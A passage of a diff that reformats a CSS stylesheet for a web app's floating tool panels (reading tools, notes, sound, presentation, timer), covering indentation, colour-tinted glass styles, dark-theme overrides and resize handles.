         color: #fff !important
     }
 
 
-    
-html[data-theme="dark"] #asyncPresentationPanel input,
-html[data-theme="dark"] #asyncPresentationPanel select {
+
+    html[data-theme="dark"] #asyncPresentationPanel input,
+    html[data-theme="dark"] #asyncPresentationPanel select {
         color: #f8fafc !important;
         background: #172033 !important;
         border-color: rgba(203, 213, 225, .3) !important
     }
 
 
-    
-html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) {
+
+    html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) {
         color: #f1f5f9 !important
     }
 
 
-    
-/* Additional annotation modes can receive pointer/touch drawing input. */
 
-    
-#asyncPresentationOverlay:is(.mode-draw, .mode-arrow, .mode-rectangle, .mode-circle, .mode-erase) {
+    /* Additional annotation modes can receive pointer/touch drawing input. */
+
+
+    #asyncPresentationOverlay:is(.mode-draw, .mode-arrow, .mode-rectangle, .mode-circle, .mode-erase) {
         pointer-events: auto;
         cursor: crosshair
     }
 
 
-    
-#asyncPresentationOverlay:is(.mode-draw, .mode-arrow, .mode-rectangle, .mode-circle, .mode-erase) #asyncPresentationCanvas {
+
+    #asyncPresentationOverlay:is(.mode-draw, .mode-arrow, .mode-rectangle, .mode-circle, .mode-erase) #asyncPresentationCanvas {
         pointer-events: auto;
         cursor: crosshair
     }
 
 
-    
-#readingToolsPanel.is-maximized .async-tool-resize-handle,
-#asyncNotesPanel.is-maximized .async-tool-resize-handle,
-#asyncSoundPanel.is-maximized .async-tool-resize-handle,
-#asyncPresentationPanel.is-maximized .async-tool-resize-handle,
-#asyncFloatingTimer.is-maximized .async-tool-resize-handle {
+
+    #readingToolsPanel.is-maximized .async-tool-resize-handle,
+    #asyncNotesPanel.is-maximized .async-tool-resize-handle,
+    #asyncSoundPanel.is-maximized .async-tool-resize-handle,
+    #asyncPresentationPanel.is-maximized .async-tool-resize-handle,
+    #asyncFloatingTimer.is-maximized .async-tool-resize-handle {
         display: none !important
     }
 
 
 
-    
-#readingToolsPanel.is-maximized .async-tool-resize-handle,
-#asyncNotesPanel.is-maximized .async-tool-resize-handle,
-#asyncSoundPanel.is-maximized .async-tool-resize-handle,
-#asyncPresentationPanel.is-maximized .async-tool-resize-handle,
-#asyncFloatingTimer.is-maximized .async-tool-resize-handle {
+
+    #readingToolsPanel.is-maximized .async-tool-resize-handle,
+    #asyncNotesPanel.is-maximized .async-tool-resize-handle,
+    #asyncSoundPanel.is-maximized .async-tool-resize-handle,
+    #asyncPresentationPanel.is-maximized .async-tool-resize-handle,
+    #asyncFloatingTimer.is-maximized .async-tool-resize-handle {
         display: none !important
     }
 
 
-    
-#asyncPresentationOverlay:is(.mode-draw, .mode-arrow, .mode-rectangle, .mode-circle, .mode-erase) {
-        pointer-events: auto;
-        cursor: crosshair
-    }
 
-
-    
-#asyncPresentationOverlay:is(.mode-draw, .mode-arrow, .mode-rectangle, .mode-circle, .mode-erase) #asyncPresentationCanvas {
+    #asyncPresentationOverlay:is(.mode-draw, .mode-arrow, .mode-rectangle, .mode-circle, .mode-erase) {
         pointer-events: auto;
         cursor: crosshair
     }
 
 
 
-    
-/* Higher-specificity overrides for the controls' original component styles. */
+    #asyncPresentationOverlay:is(.mode-draw, .mode-arrow, .mode-rectangle, .mode-circle, .mode-erase) #asyncPresentationCanvas {
+        pointer-events: auto;
+        cursor: crosshair
+    }
 
-    
-#asyncNotesPanel .aux-window-actions .window-close,
-#asyncSoundPanel .aux-window-actions .window-close,
-#asyncPresentationPanel .aux-window-actions .window-close {
+
+
+
+    /* Higher-specificity overrides for the controls' original component styles. */
+
+
+    #asyncNotesPanel .aux-window-actions .window-close,
+    #asyncSoundPanel .aux-window-actions .window-close,
+    #asyncPresentationPanel .aux-window-actions .window-close {
         background: #ff5f57 !important;
         color: transparent !important
     }
 
 
-    
-#asyncNotesPanel .aux-window-actions .window-minimize,
-#asyncSoundPanel .aux-window-actions .window-minimize,
-#asyncPresentationPanel .aux-window-actions .window-minimize {
+
+    #asyncNotesPanel .aux-window-actions .window-minimize,
+    #asyncSoundPanel .aux-window-actions .window-minimize,
+    #asyncPresentationPanel .aux-window-actions .window-minimize {
         background: #febc2e !important;
         color: transparent !important
     }
 
 
-    
-#asyncNotesPanel .aux-window-actions .window-maximize,
-#asyncSoundPanel .aux-window-actions .window-maximize,
-#asyncPresentationPanel .aux-window-actions .window-maximize {
+
+    #asyncNotesPanel .aux-window-actions .window-maximize,
+    #asyncSoundPanel .aux-window-actions .window-maximize,
+    #asyncPresentationPanel .aux-window-actions .window-maximize {
         background: #28c840 !important;
         color: transparent !important
     }
 
 
-    
-#aftClose,
-#aftMinimize,
-#aftMaximize {
+
+    #aftClose,
+    #aftMinimize,
+    #aftMaximize {
         width: 12px !important;
         height: 12px !important;
         min-width: 12px !important;
@@ -2784,38 +2827,38 @@ html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) 
     }
 
 
-    
-#aftClose {
+
+    #aftClose {
         background: #ff5f57 !important
     }
 
 
-    
-#aftMinimize {
+
+    #aftMinimize {
         background: #febc2e !important
     }
 
 
-    
-#aftMaximize {
+
+    #aftMaximize {
         background: #28c840 !important
     }
 
 
 
-    
-/* ============================================================
+
+    /* ============================================================
        ASYNC COLOUR-MATCHED GLASSMORPHISM
        Glass keeps each tool's established accent identity:
        blue / teal / purple / orange / red.
        ============================================================ */
 
 
-    
-/* Light-theme tinted glass surfaces. */
 
-    
-#readingToolsPanel {
+    /* Light-theme tinted glass surfaces. */
+
+
+    #readingToolsPanel {
         --tool-glass: rgba(219, 234, 254, .70);
         --tool-glass-deep: rgba(191, 219, 254, .45);
         --tool-glass-border: rgba(59, 130, 246, .34);
@@ -2828,8 +2871,8 @@ html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) 
     }
 
 
-    
-#asyncNotesPanel {
+
+    #asyncNotesPanel {
         --tool-glass: rgba(204, 251, 241, .70);
         --tool-glass-deep: rgba(153, 246, 228, .43);
         --tool-glass-border: rgba(13, 148, 136, .34);
@@ -2842,11 +2885,11 @@ html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) 
     }
 
 
-    
 
 
-    
-#asyncSoundPanel {
+
+
+    #asyncSoundPanel {
         --tool-glass: rgba(255, 237, 213, .74);
         --tool-glass-deep: rgba(254, 215, 170, .47);
         --tool-glass-border: rgba(217, 119, 6, .36);
@@ -2859,8 +2902,8 @@ html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) 
     }
 
 
-    
-#asyncPresentationPanel {
+
+    #asyncPresentationPanel {
         --tool-glass: rgba(255, 228, 230, .73);
         --tool-glass-deep: rgba(254, 205, 211, .46);
         --tool-glass-border: rgba(225, 29, 72, .34);
@@ -2873,14 +2916,14 @@ html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) 
     }
 
 
-    
-/* Frosted surfaces: retain hue while allowing the page underneath to show. */
 
-    
-#readingToolsPanel,
-#asyncNotesPanel,
-#asyncSoundPanel,
-#asyncPresentationPanel {
+    /* Frosted surfaces: retain hue while allowing the page underneath to show. */
+
+
+    #readingToolsPanel,
+    #asyncNotesPanel,
+    #asyncSoundPanel,
+    #asyncPresentationPanel {
         backdrop-filter: blur(26px) saturate(175%) !important;
         -webkit-backdrop-filter: blur(26px) saturate(175%) !important;
         box-shadow:
@@ -2892,11 +2935,11 @@ html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) 
     }
 
 
-    
-/* Color-matched translucent header strips. */
 
-    
-#readingToolsPanel .rt-header {
+    /* Color-matched translucent header strips. */
+
+
+    #readingToolsPanel .rt-header {
         background: linear-gradient(112deg, rgba(59, 130, 246, .86), rgba(37, 99, 235, .68)) !important;
         border: 1px solid rgba(255, 255, 255, .42) !important;
         border-bottom-color: rgba(255, 255, 255, .30) !important;
@@ -2906,8 +2949,8 @@ html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) 
     }
 
 
-    
-#asyncNotesPanel .aux-head {
+
+    #asyncNotesPanel .aux-head {
         background: linear-gradient(112deg, rgba(13, 148, 136, .87), rgba(15, 118, 110, .68)) !important;
         border: 1px solid rgba(255, 255, 255, .42) !important;
         box-shadow: inset 0 1px 0 rgba(255, 255, 255, .38), 0 5px 16px rgba(13, 148, 136, .12);
@@ -2916,11 +2959,11 @@ html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) 
     }
 
 
-    
 
 
-    
-#asyncSoundPanel .aux-head {
+
+
+    #asyncSoundPanel .aux-head {
         background: linear-gradient(112deg, rgba(217, 119, 6, .88), rgba(180, 83, 9, .68)) !important;
         border: 1px solid rgba(255, 255, 255, .42) !important;
         box-shadow: inset 0 1px 0 rgba(255, 255, 255, .38), 0 5px 16px rgba(217, 119, 6, .12);
@@ -2929,8 +2972,8 @@ html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) 
     }
 
 
-    
-#asyncPresentationPanel .aux-head {
+
+    #asyncPresentationPanel .aux-head {
         background: linear-gradient(112deg, rgba(225, 29, 72, .87), rgba(190, 18, 60, .68)) !important;
         border: 1px solid rgba(255, 255, 255, .42) !important;
         box-shadow: inset 0 1px 0 rgba(255, 255, 255, .38), 0 5px 16px rgba(225, 29, 72, .12);
@@ -2939,8 +2982,8 @@ html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) 
     }
 
 
-    
-#asyncFloatingTimer {
+
+    #asyncFloatingTimer {
         background: linear-gradient(135deg, rgba(59, 130, 246, .48), rgba(30, 64, 175, .32)) !important;
         border: 1px solid rgba(191, 219, 254, .58) !important;
         box-shadow: 0 18px 48px rgba(30, 64, 175, .22),
@@ -2951,8 +2994,8 @@ html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) 
     }
 
 
-    
-#asyncFloatingTimer .aft-header {
+
+    #asyncFloatingTimer .aft-header {
         background: linear-gradient(112deg, rgba(59, 130, 246, .64), rgba(37, 99, 235, .44)) !important;
         border: 1px solid rgba(255, 255, 255, .32);
         border-radius: 12px;
@@ -2963,14 +3006,14 @@ html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) 
     }
 
 
-    
-/* Controls use matching soft colour glass instead of neutral grey. */
 
-    
-#readingToolsPanel :is(.rt-btn, .rt-select, select, input:not([type="range"])),
-#asyncNotesPanel :is(input, select, .ql-toolbar.ql-snow),
-#asyncSoundPanel :is(select, button:not(.window-icon-btn), input:not([type="range"])),
-#asyncPresentationPanel :is(button:not(.window-icon-btn), input:not([type="range"]), select) {
+    /* Controls use matching soft colour glass instead of neutral grey. */
+
+
+    #readingToolsPanel :is(.rt-btn, .rt-select, select, input:not([type="range"])),
+    #asyncNotesPanel :is(input, select, .ql-toolbar.ql-snow),
+    #asyncSoundPanel :is(select, button:not(.window-icon-btn), input:not([type="range"])),
+    #asyncPresentationPanel :is(button:not(.window-icon-btn), input:not([type="range"]), select) {
         background-color: var(--tool-control-glass) !important;
         border-color: var(--tool-glass-border) !important;
         box-shadow: inset 0 1px 0 rgba(255, 255, 255, .62),
@@ -2980,101 +3023,101 @@ html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) 
     }
 
 
-    
-#readingToolsPanel :is(.rt-btn, .rt-select, select) {
+
+    #readingToolsPanel :is(.rt-btn, .rt-select, select) {
         color: #1e3a8a;
     }
 
 
-    
-#asyncNotesPanel :is(input, select, .ql-toolbar.ql-snow) {
+
+    #asyncNotesPanel :is(input, select, .ql-toolbar.ql-snow) {
         color: #134e4a;
     }
 
 
-    
 
 
-    
-#asyncSoundPanel :is(select, button:not(.window-icon-btn), input:not([type="range"])) {
+
+
+    #asyncSoundPanel :is(select, button:not(.window-icon-btn), input:not([type="range"])) {
         color: #78350f;
     }
 
 
-    
-#asyncPresentationPanel :is(button:not(.window-icon-btn), input:not([type="range"]), select) {
+
+    #asyncPresentationPanel :is(button:not(.window-icon-btn), input:not([type="range"]), select) {
         color: #881337;
     }
 
 
-    
-#readingToolsPanel :is(.rt-btn, select):hover,
-#asyncNotesPanel :is(.notes-toolbar button, input, select):hover,
-#asyncSoundPanel :is(.sound-choice button, .sound-actions button):hover,
-#asyncPresentationPanel .presentation-actions button:hover {
+
+    #readingToolsPanel :is(.rt-btn, select):hover,
+    #asyncNotesPanel :is(.notes-toolbar button, input, select):hover,
+    #asyncSoundPanel :is(.sound-choice button, .sound-actions button):hover,
+    #asyncPresentationPanel .presentation-actions button:hover {
         background-color: var(--tool-control-hover) !important;
         border-color: var(--tool-accent) !important;
     }
 
 
-    
-/* Keep the Notes editor translucent and teal-tinted. */
 
-    
-#asyncNotesPanel #asyncQuillEditor,
-#asyncNotesPanel .ql-container.ql-snow,
-#asyncNotesPanel .ql-editor {
+    /* Keep the Notes editor translucent and teal-tinted. */
+
+
+    #asyncNotesPanel #asyncQuillEditor,
+    #asyncNotesPanel .ql-container.ql-snow,
+    #asyncNotesPanel .ql-editor {
         background: rgba(13, 148, 136, .045) !important;
     }
 
 
-    
-#asyncNotesPanel .ql-toolbar.ql-snow {
+
+    #asyncNotesPanel .ql-toolbar.ql-snow {
         background: rgba(13, 148, 136, .12) !important;
         border-color: rgba(13, 148, 136, .24) !important;
         box-shadow: inset 0 1px 0 rgba(255, 255, 255, .58);
     }
 
 
-    
-#asyncNotesPanel .ql-snow .ql-stroke {
+
+    #asyncNotesPanel .ql-snow .ql-stroke {
         stroke: #0f766e;
     }
 
 
-    
-#asyncNotesPanel .ql-snow .ql-fill {
+
+    #asyncNotesPanel .ql-snow .ql-fill {
         fill: #0f766e;
     }
 
 
-    
-#asyncNotesPanel .ql-snow .ql-picker {
+
+    #asyncNotesPanel .ql-snow .ql-picker {
         color: #0f766e;
     }
 
 
-    
-
-    
 
 
-    
 
 
-    
-/* Sound actions retain the orange identity. */
 
-    
-#asyncSoundPanel .sound-choice button.active {
+
+
+
+
+    /* Sound actions retain the orange identity. */
+
+
+    #asyncSoundPanel .sound-choice button.active {
         background: rgba(217, 119, 6, .20) !important;
         border-color: rgba(217, 119, 6, .58) !important;
         color: #78350f !important;
     }
 
 
-    
-#asyncSoundPanel .sound-actions button {
+
+    #asyncSoundPanel .sound-actions button {
         background: linear-gradient(135deg, rgba(217, 119, 6, .88), rgba(180, 83, 9, .76)) !important;
         border: 1px solid rgba(255, 255, 255, .42) !important;
         color: #fff !important;
@@ -3082,30 +3125,30 @@ html[data-theme="dark"] #asyncPresentationPanel :is(p, div, label, span, small) 
     }
 
 
-    
-/* Presentation controls remain red/pink-tinted glass. */
 
-    
-#asyncPresentationPanel .presentation-actions button {
+    /* Presentation controls remain red/pink-tinted glass. */
+
+
+    #asyncPresentationPanel .presentation-actions button {
         background: rgba(225, 29, 72, .10) !important;
         border-color: rgba(225, 29, 72, .25) !important;
         color: #881337 !important;
     }
 
 
-    
-#asyncPresentationPanel .presentation-actions button.active {
+
+    #asyncPresentationPanel .presentation-actions button.active {
         background: rgba(225, 29, 72, .23) !important;
         border-color: rgba(225, 29, 72, .58) !important;
         color: #881337 !important;
     }
 
 
-    
-/* Dark theme: preserve each hue in deeper tinted glass, not generic charcoal. */
 
-    
-html[data-theme="dark"] #readingToolsPanel {
+    /* Dark theme: preserve each hue in deeper tinted glass, not generic charcoal. */
+
+
+    html[data-theme="dark"] #readingToolsPanel {
         --tool-glass: rgba(30, 64, 175, .49);
         --tool-glass-deep: rgba(30, 58, 138, .34);
         --tool-glass-border: rgba(147, 197, 253, .30);
@@ -3117,8 +3160,8 @@ html[data-theme="dark"] #readingToolsPanel {
     }
 
 
-    
-html[data-theme="dark"] #asyncNotesPanel {
+
+    html[data-theme="dark"] #asyncNotesPanel {
         --tool-glass: rgba(15, 118, 110, .49);
         --tool-glass-deep: rgba(4, 78, 75, .34);
         --tool-glass-border: rgba(94, 234, 212, .27);
@@ -3130,11 +3173,11 @@ html[data-theme="dark"] #asyncNotesPanel {
     }
 
 
-    
 
 
-    
-html[data-theme="dark"] #asyncSoundPanel {
+
+
+    html[data-theme="dark"] #asyncSoundPanel {
         --tool-glass: rgba(154, 52, 18, .49);
         --tool-glass-deep: rgba(124, 45, 18, .36);
         --tool-glass-border: rgba(253, 186, 116, .30);
@@ -3146,8 +3189,8 @@ html[data-theme="dark"] #asyncSoundPanel {
     }
 
 
-    
-html[data-theme="dark"] #asyncPresentationPanel {
+
+    html[data-theme="dark"] #asyncPresentationPanel {
         --tool-glass: rgba(159, 18, 57, .49);
         --tool-glass-deep: rgba(136, 19, 55, .36);
         --tool-glass-border: rgba(253, 164, 175, .30);
@@ -3159,11 +3202,11 @@ html[data-theme="dark"] #asyncPresentationPanel {
     }
 
 
-    
-html[data-theme="dark"] #readingToolsPanel :is(.rt-btn, .rt-select, select, input:not([type="range"])),
-html[data-theme="dark"] #asyncNotesPanel :is(input, select, .ql-toolbar.ql-snow),
-html[data-theme="dark"] #asyncSoundPanel :is(select, button:not(.window-icon-btn), input:not([type="range"])),
-html[data-theme="dark"] #asyncPresentationPanel :is(button:not(.window-icon-btn), input:not([type="range"]), select) {
+
+    html[data-theme="dark"] #readingToolsPanel :is(.rt-btn, .rt-select, select, input:not([type="range"])),
+    html[data-theme="dark"] #asyncNotesPanel :is(input, select, .ql-toolbar.ql-snow),
+    html[data-theme="dark"] #asyncSoundPanel :is(select, button:not(.window-icon-btn), input:not([type="range"])),
+    html[data-theme="dark"] #asyncPresentationPanel :is(button:not(.window-icon-btn), input:not([type="range"]), select) {
         background-color: var(--tool-control-glass) !important;
         border-color: var(--tool-glass-border) !important;
         color: #f8fafc !important;
@@ -3172,83 +3215,83 @@ html[data-theme="dark"] #asyncPresentationPanel :is(button:not(.window-icon-btn)
     }
 
 
-    
-html[data-theme="dark"] #readingToolsPanel :is(.rt-btn, .rt-select, select),
-html[data-theme="dark"] #asyncNotesPanel :is(input, select, .ql-editor, .ql-picker),
-html[data-theme="dark"] #asyncSoundPanel :is(select, button:not(.window-icon-btn)),
-html[data-theme="dark"] #asyncPresentationPanel :is(button:not(.window-icon-btn), input:not([type="range"]), select) {
+
+    html[data-theme="dark"] #readingToolsPanel :is(.rt-btn, .rt-select, select),
+    html[data-theme="dark"] #asyncNotesPanel :is(input, select, .ql-editor, .ql-picker),
+    html[data-theme="dark"] #asyncSoundPanel :is(select, button:not(.window-icon-btn)),
+    html[data-theme="dark"] #asyncPresentationPanel :is(button:not(.window-icon-btn), input:not([type="range"]), select) {
         color: #f8fafc !important;
     }
 
 
-    
-html[data-theme="dark"] #asyncNotesPanel #asyncQuillEditor,
-html[data-theme="dark"] #asyncNotesPanel .ql-container.ql-snow,
-html[data-theme="dark"] #asyncNotesPanel .ql-editor {
+
+    html[data-theme="dark"] #asyncNotesPanel #asyncQuillEditor,
+    html[data-theme="dark"] #asyncNotesPanel .ql-container.ql-snow,
+    html[data-theme="dark"] #asyncNotesPanel .ql-editor {
         background: rgba(13, 148, 136, .10) !important;
         color: #ecfdf5 !important;
     }
 
 
-    
-html[data-theme="dark"] #asyncNotesPanel .ql-toolbar.ql-snow {
+
+    html[data-theme="dark"] #asyncNotesPanel .ql-toolbar.ql-snow {
         background: rgba(13, 148, 136, .19) !important;
         border-color: rgba(94, 234, 212, .24) !important;
     }
 
 
-    
-html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-stroke {
+
+    html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-stroke {
         stroke: #99f6e4;
     }
 
 
-    
-html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-fill {
+
+    html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-fill {
         fill: #99f6e4;
     }
 
 
-    
-html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-picker {
+
+    html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-picker {
         color: #ccfbf1;
     }
 
 
-    
 
 
-    
 
 
-    
-html[data-theme="dark"] #asyncSoundPanel .sound-actions button {
+
+
+
+    html[data-theme="dark"] #asyncSoundPanel .sound-actions button {
         background: linear-gradient(135deg, rgba(217, 119, 6, .90), rgba(180, 83, 9, .78)) !important;
         color: #fff !important;
     }
 
 
-    
-html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button {
+
+    html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button {
         background: rgba(225, 29, 72, .17) !important;
         border-color: rgba(253, 164, 175, .27) !important;
         color: #fff1f2 !important;
     }
 
 
-    
-html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.active {
+
+    html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.active {
         background: rgba(225, 29, 72, .32) !important;
         border-color: rgba(253, 164, 175, .48) !important;
         color: #fff !important;
     }
 
 
-    
-/* The minimized Presentation Tools strip retains the same red glass tint. */
 
-    
-#asyncPresentationPanel.is-minimized {
+    /* The minimized Presentation Tools strip retains the same red glass tint. */
+
+
+    #asyncPresentationPanel.is-minimized {
         background: linear-gradient(135deg, rgba(225, 29, 72, .24), rgba(190, 18, 60, .16)) !important;
         border-color: rgba(225, 29, 72, .35) !important;
         backdrop-filter: blur(22px) saturate(170%) !important;
@@ -3257,20 +3300,20 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
     }
 
 
-    
-html[data-theme="dark"] #asyncPresentationPanel.is-minimized {
+
+    html[data-theme="dark"] #asyncPresentationPanel.is-minimized {
         background: linear-gradient(135deg, rgba(159, 18, 57, .65), rgba(136, 19, 55, .46)) !important;
         border-color: rgba(253, 164, 175, .32) !important;
     }
 
 
-    
-/* Timer input fields and controls keep a matching blue glass tint. */
 
-    
-#asyncFloatingTimer .aft-inputs input,
-#asyncFloatingTimer .aft-actions button,
-#aftTickToggle {
+    /* Timer input fields and controls keep a matching blue glass tint. */
+
+
+    #asyncFloatingTimer .aft-inputs input,
+    #asyncFloatingTimer .aft-actions button,
+    #aftTickToggle {
         background: rgba(59, 130, 246, .22) !important;
         border: 1px solid rgba(219, 234, 254, .42) !important;
         box-shadow: inset 0 1px 0 rgba(255, 255, 255, .30),
@@ -3280,58 +3323,58 @@ html[data-theme="dark"] #asyncPresentationPanel.is-minimized {
     }
 
 
-    
-#asyncFloatingTimer .aft-actions button:first-child {
+
+    #asyncFloatingTimer .aft-actions button:first-child {
         background: linear-gradient(135deg, rgba(59, 130, 246, .88), rgba(37, 99, 235, .72)) !important;
         color: #fff !important;
     }
 
 
-    
-html[data-theme="dark"] #asyncFloatingTimer .aft-inputs input,
-html[data-theme="dark"] #asyncFloatingTimer .aft-actions button,
-html[data-theme="dark"] #aftTickToggle {
+
+    html[data-theme="dark"] #asyncFloatingTimer .aft-inputs input,
+    html[data-theme="dark"] #asyncFloatingTimer .aft-actions button,
+    html[data-theme="dark"] #aftTickToggle {
         background: rgba(30, 64, 175, .38) !important;
         border-color: rgba(147, 197, 253, .30) !important;
         color: #fff !important;
     }
 
 
-    
-/* Same tool colours stay visible on hover without losing the glass surface. */
 
-    
-#readingToolsPanel :is(.rt-btn, .rt-select):hover {
+    /* Same tool colours stay visible on hover without losing the glass surface. */
+
+
+    #readingToolsPanel :is(.rt-btn, .rt-select):hover {
         color: #1d4ed8 !important;
     }
 
 
-    
-#asyncNotesPanel .notes-toolbar button:hover {
+
+    #asyncNotesPanel .notes-toolbar button:hover {
         color: #0f766e !important;
     }
 
 
-    
 
 
-    
-#asyncSoundPanel .sound-choice button.active {
+
+
+    #asyncSoundPanel .sound-choice button.active {
         color: #92400e !important;
     }
 
 
-    
-#asyncPresentationPanel .presentation-actions button.active {
+
+    #asyncPresentationPanel .presentation-actions button.active {
         color: #be123c !important;
     }
 
 
-    
-html[data-theme="dark"] #readingToolsPanel :is(.rt-btn, .rt-select):hover,
-html[data-theme="dark"] #asyncNotesPanel .notes-toolbar button:hover,
-html[data-theme="dark"] #asyncSoundPanel .sound-choice button.active,
-html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.active {
+
+    html[data-theme="dark"] #readingToolsPanel :is(.rt-btn, .rt-select):hover,
+    html[data-theme="dark"] #asyncNotesPanel .notes-toolbar button:hover,
+    html[data-theme="dark"] #asyncSoundPanel .sound-choice button.active,
+    html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.active {
         color: #fff !important;
     }
 
@@ -3366,7 +3409,7 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         border-radius: 10px !important;
         background: rgba(255, 255, 255, .17) !important;
         color: #fff !important;
-        box-shadow: inset 0 1px 0 rgba(255,255,255,.32), 0 3px 9px rgba(15,23,42,.10) !important;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .32), 0 3px 9px rgba(15, 23, 42, .10) !important;
         backdrop-filter: blur(12px) saturate(150%);
         -webkit-backdrop-filter: blur(12px) saturate(150%);
         font-size: 13px !important;
@@ -3400,7 +3443,7 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         filter: none !important;
         background: rgba(255, 255, 255, .29) !important;
         transform: translateY(-1px) !important;
-        box-shadow: inset 0 1px 0 rgba(255,255,255,.42), 0 5px 12px rgba(15,23,42,.14) !important;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .42), 0 5px 12px rgba(15, 23, 42, .14) !important;
     }
 
     #asyncTimerDrag>.aft-tick-toggle {
@@ -3412,7 +3455,7 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
     #asyncNotesPanel #asyncNoteTitle {
         background: #fff !important;
         color: #1f2937 !important;
-        border-color: rgba(100,116,139,.28) !important;
+        border-color: rgba(100, 116, 139, .28) !important;
     }
 
     #asyncNotesPanel #asyncQuillEditor,
@@ -3470,10 +3513,25 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         box-shadow: none !important;
     }
 
-    .async-tool-resize-handle[data-resize="ne"] { top: 0; right: 0; }
-    .async-tool-resize-handle[data-resize="nw"] { top: 0; left: 0; }
-    .async-tool-resize-handle[data-resize="se"] { bottom: 0; right: 0; }
-    .async-tool-resize-handle[data-resize="sw"] { bottom: 0; left: 0; }
+    .async-tool-resize-handle[data-resize="ne"] {
+        top: 0;
+        right: 0;
+    }
+
+    .async-tool-resize-handle[data-resize="nw"] {
+        top: 0;
+        left: 0;
+    }
+
+    .async-tool-resize-handle[data-resize="se"] {
+        bottom: 0;
+        right: 0;
+    }
+
+    .async-tool-resize-handle[data-resize="sw"] {
+        bottom: 0;
+        left: 0;
+    }
 
     .async-tool-resize-handle[data-resize="ne"]::after,
     .async-tool-resize-handle[data-resize="nw"]::after,
@@ -3487,17 +3545,25 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         left: 3px;
         border-radius: 50%;
         background:
-            radial-gradient(circle at 3px 3px, rgba(255,255,255,.98) 1.35px, transparent 1.8px),
-            radial-gradient(circle at 8px 8px, rgba(255,255,255,.88) 1.35px, transparent 1.8px),
-            radial-gradient(circle at 13px 13px, rgba(255,255,255,.75) 1.35px, transparent 1.8px);
-        filter: drop-shadow(0 1px 1px rgba(15,23,42,.48));
+            radial-gradient(circle at 3px 3px, rgba(255, 255, 255, .98) 1.35px, transparent 1.8px),
+            radial-gradient(circle at 8px 8px, rgba(255, 255, 255, .88) 1.35px, transparent 1.8px),
+            radial-gradient(circle at 13px 13px, rgba(255, 255, 255, .75) 1.35px, transparent 1.8px);
+        filter: drop-shadow(0 1px 1px rgba(15, 23, 42, .48));
         opacity: .76;
         transition: opacity .18s ease, transform .18s ease;
     }
 
-    .async-tool-resize-handle[data-resize="ne"]::after { transform: rotate(90deg); }
-    .async-tool-resize-handle[data-resize="se"]::after { transform: rotate(180deg); }
-    .async-tool-resize-handle[data-resize="sw"]::after { transform: rotate(270deg); }
+    .async-tool-resize-handle[data-resize="ne"]::after {
+        transform: rotate(90deg);
+    }
+
+    .async-tool-resize-handle[data-resize="se"]::after {
+        transform: rotate(180deg);
+    }
+
+    .async-tool-resize-handle[data-resize="sw"]::after {
+        transform: rotate(270deg);
+    }
 
     .async-tool-resize-handle[data-resize="ne"]:hover::after,
     .async-tool-resize-handle[data-resize="nw"]:hover::after,
@@ -3529,8 +3595,8 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         z-index: 100130 !important;
     }
 
-    #asyncPresentationPanel.is-minimized > .aux-head,
-    #asyncPresentationPanel.is-minimized > :not(.presentation-actions) {
+    #asyncPresentationPanel.is-minimized>.aux-head,
+    #asyncPresentationPanel.is-minimized> :not(.presentation-actions) {
         display: none !important;
     }
 
@@ -3554,7 +3620,7 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         border-radius: 11px !important;
         font-size: 0 !important;
         line-height: 0 !important;
-        box-shadow: inset 0 1px 0 rgba(255,255,255,.4), 0 3px 9px rgba(15,23,42,.12) !important;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .4), 0 3px 9px rgba(15, 23, 42, .12) !important;
         backdrop-filter: blur(14px) saturate(160%);
         -webkit-backdrop-filter: blur(14px) saturate(160%);
     }
@@ -3566,8 +3632,8 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
     }
 
     #asyncPresentationPanel.is-minimized .presentation-actions button.active {
-        background: rgba(225,29,72,.25) !important;
-        border-color: rgba(225,29,72,.55) !important;
+        background: rgba(225, 29, 72, .25) !important;
+        border-color: rgba(225, 29, 72, .55) !important;
         color: #9f1239 !important;
     }
 
@@ -3606,42 +3672,87 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
     }
 
     @keyframes asyncToolSpring {
-        0%   { opacity: 0; scale: .76; filter: blur(7px); }
-        58%  { opacity: 1; scale: 1.045; filter: blur(0); }
-        78%  { opacity: 1; scale: .985; }
-        100% { opacity: 1; scale: 1; filter: blur(0); }
+        0% {
+            opacity: 0;
+            scale: .76;
+            filter: blur(7px);
+        }
+
